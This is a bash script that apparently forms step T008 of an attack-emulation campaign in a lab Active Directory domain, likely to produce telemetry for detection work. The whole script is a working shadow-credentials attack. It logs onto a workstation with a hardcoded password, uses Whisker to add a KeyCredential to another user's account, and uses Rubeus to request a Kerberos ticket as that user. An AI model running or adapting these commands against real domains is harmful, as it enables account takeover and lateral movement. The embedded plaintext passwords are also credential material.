#!/usr/bin/env bash
# T008 — Shadow credentials from ws01 (analyst_t1) using Whisker.exe
# Adds a new KeyCredential to target user and requests TGT via Rubeus.
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
source "${LIB}/campaign-a-common.sh"

CASE_ID="CADRE-T008-SHADOW-CREDS-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T008 Shadow credentials | ${CASE_ID} | T0=${T0} ==="

DOMAIN_CHILD="${DOMAIN_CHILD:-child.cadre.local}"
DC02="${DC02:-dc02.child.cadre.local}"
TARGET_USER="analyst_t2"

CMD='
$w = "C:\Tools\cadre-attack\Whisker.exe";
$r = "C:\Tools\cadre-attack\Rubeus.exe";
if (-not (Test-Path $w)) { throw "Whisker.exe not found" }
if (-not (Test-Path $r)) { throw "Rubeus.exe not found" }
& $w add /target:"'''"${TARGET_USER}"'''" /domain:"'''"${DOMAIN_CHILD}"'''" /dc:"'''"${DC02}"'''";
Write-Output "T008_OK: shadow credentials added for '''"${TARGET_USER}"'''";
& $r asktgt /user:"'''"${TARGET_USER}"'''" /domain:"'''"${DOMAIN_CHILD}"'''" /dc:"'''"${DC02}"'''" /certificate:C:\Users\analyst_t1\AppData\Local\Temp\Whisker_*.pfx /password:WhiskerPassword123 /nowrap
'

ws01_exec_as analyst_t1 'T13r_An@lyst!' "$CMD"

cadre_export "${CASE_ID}" T008 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T008 run complete ==="
